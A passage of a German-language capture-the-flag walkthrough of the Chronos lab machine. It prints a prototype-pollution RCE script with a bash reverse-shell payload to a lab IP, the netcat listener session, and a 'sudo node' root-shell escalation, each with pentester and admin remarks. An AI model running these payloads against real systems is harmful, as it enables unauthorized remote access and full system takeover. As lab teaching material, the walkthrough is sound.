+└─# <span class="command">wget https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/attacker/EJS-RCE-attack.py</span></div>
+                     <pre>[...]
+2022-10-30 02:46:20 (69,2 MB/s) - »EJS-RCE-attack.py« gespeichert [685/685]
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat EJS-RCE-attack.py</span></div>
+                     <pre>
+# Run this .py to perform EJS-RCE attack
+[...]
+# commands to run on victim machine
+<span class="command">cmd = 'bash -c "bash -i &> /dev/tcp/192.168.2.153/9003 0>&1"'</span> <span class="comment"><!-- Reverse Shell Payload --></span>
+
+print("Starting Attack...")
+# pollute
+requests.post('<span class="command">http://192.168.2.115:5555</span>', files = {'__proto__.outputFunctionName': ( <span class="comment"><!-- Ziel: Weitergeleiteter Port --></span>
+    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})
+
+# execute command
+requests.get('<span class="command">http://192.168.2.115:5555</span>')
+print("Finished!")
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Python-Exploit-Skript für die EJS/express-fileupload-Schwachstelle wird heruntergeladen. Es ist so konfiguriert, dass es eine Reverse Shell zum Angreifer (`192.168.2.153`) auf Port `9003` sendet und das Ziel über den weitergeleiteten Port `5555` anspricht.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.115 -p5555</span></div>
+                     <pre>
+[...]
+PORT     STATE SERVICE VERSION
+<span class="command">5555/tcp open  http    Node.js (Express middleware)</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.115:5555</span></div>
+                     <pre>
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Chronos - Version 2</title>
+    </head>
+    <body>
+        <h1>Coming Soon...</h1>
+    </body>
+</html>
+</pre> <span class="comment"><!-- Maskierung < > --></span>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Nmap und curl bestätigen, dass der weitergeleitete Port 5555 erreichbar ist und die Chronos-v2-Anwendung ("Coming Soon...") dahinter läuft.</p>
+
+            <p class="analysis"><strong>Zweite Reverse Shell empfangen:</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9003</span></div>
+                     <pre><span class="password">listening on [any] 9003 ...</span></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 EJS-RCE-attack.py</span></div>
+                     <pre>
+Starting Attack...
+Finished!
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Fortsetzung der Listener-Ausgabe -->
+                     <pre>
+<span class="password">listening on [any] 9003 ...</span>
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.115] 48340</span>
+bash: cannot set terminal process group (829): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt" style="color: yellow;">imera@chronos:/opt/chronos-v2/backend$</span> <span class="command">id</span>
+<span class="command">uid=1000(imera) gid=1000(imera) groups=1000(imera)</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Listener auf Port 9003 wird gestartet, dann wird das Python-Exploit-Skript ausgeführt. Der Exploit sendet die Payloads an Port 5555. Kurz darauf empfängt der Listener die Verbindung und stellt eine Shell bereit.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die Prototyp-Pollution-Schwachstelle in der Chronos-v2-Anwendung wurde erfolgreich ausgenutzt. Da diese Anwendung wahrscheinlich als Benutzer `imera` lief, wurde eine Shell als `imera` erlangt. Dies ist ein wichtiger Schritt zur Privilegienerweiterung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell. Lesen Sie die User-Flag als `imera`. Überprüfen Sie die `sudo`-Berechtigungen für `imera` (`sudo -l`).<br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie Node.js-Abhängigkeiten (insbesondere `express-fileupload`). Überprüfen Sie Anwendungen auf Prototyp-Pollution-Schwachstellen. Führen Sie Dienste mit den geringstmöglichen Rechten aus.</p>
+
+             <p class="analysis"><strong>Enumeration als imera:</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">imera@chronos:~$</span> <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span></pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die User-Flag wird ausgelesen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> User-Flag erfolgreich erfasst.</p>
+
+        </section>
+
+        <section id="privilege-escalation-poc">
+            <h2>Privilege Escalation (POC - sudo node)</h2>
+             <p class="analysis"><strong>Ziel:</strong> Demonstration der Ausnutzung der `sudo`-Berechtigung für den `node`-Befehl durch den Benutzer `imera`, um eine Root-Shell zu erlangen.</p>
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 *   Shell-Zugriff als Benutzer `imera`.
+                 *   `sudo`-Berechtigung für `imera`, um `/usr/local/bin/node` ohne Passwort auszuführen (`NOPASSWD: /usr/local/bin/node`).
+             </p>
+              <p class="recommendation"><strong>Risiko:</strong> Kritisch. Diese Fehlkonfiguration erlaubt einem Benutzer mit spezifischen `sudo`-Rechten (hier für `node`) die vollständige Übernahme des Systems mit Root-Rechten.</p>
+
+             <p class="analysis"><strong>Schritt 1: Überprüfung der sudo-Rechte</strong></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">imera@chronos:~$</span> <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for imera on chronos:
+    env_reset, mail_badpass,
+    secure_path=...
+
+User imera may run the following commands on chronos:
+    <span class="password">(ALL) NOPASSWD: /usr/local/bin/npm</span>
+    <span class="password">(ALL) NOPASSWD: /usr/local/bin/node</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` bestätigt, dass `imera` sowohl `npm` als auch `node` ohne Passwort als jeder Benutzer (einschließlich `root`) ausführen darf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine klare und leicht auszunutzende Fehlkonfiguration für die Privilegienerweiterung.</p>
+
+             <p class="analysis"><strong>Schritt 2: Ausnutzung von `sudo node`</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">imera@chronos:~$</span> <span class="command">sudo -u root node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span></div>
+                     <pre>
+<span class="prompt" style="color: red;">#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `node`-Befehl wird mit `sudo -u root` ausgeführt. Die Option `-e` führt den übergebenen JavaScript-Code aus:
+                 *   `require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})`: Startet einen neuen `/bin/sh`-Prozess und verbindet dessen Standard-Input (0), -Output (1) und -Error (2) mit dem des Node.js-Prozesses, wodurch eine interaktive Shell bereitgestellt wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Eine Root-Shell wurde direkt über die `sudo`-Regel erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Admin):</strong> Entfernen oder beschränken Sie die `sudo`-Regel für `node` und `npm` für den Benutzer `imera`. Gewähren Sie `sudo`-Rechte nur für spezifische, absolut notwendige Befehle und vermeiden Sie Programme, die Shell-Escapes ermöglichen (siehe GTFOBins).</p>
+
+             <p class="analysis"><strong>Schritt 3: Root-Flag lesen</strong></p>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">#</span> <span class="command">cd /root</span></div>
+                     <div class="prompt" style="color: red;">#</span> <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                     <div class="prompt" style="color: red;">#</span> <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span></pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Aus der Root-Shell wird die Root-Flag gelesen.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Ziel erreicht.</p>
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/imera/user.txt</div>
+                     <div class="flag-value"><span class="password">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="prompt" style="color: red;">#</span> <span class="command">cat /root/root.txt</span></div>
+                     <div class="flag-value"><span class="password">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 30. Oktober 2022</p>
+    </footer>
+</body>
+</html>
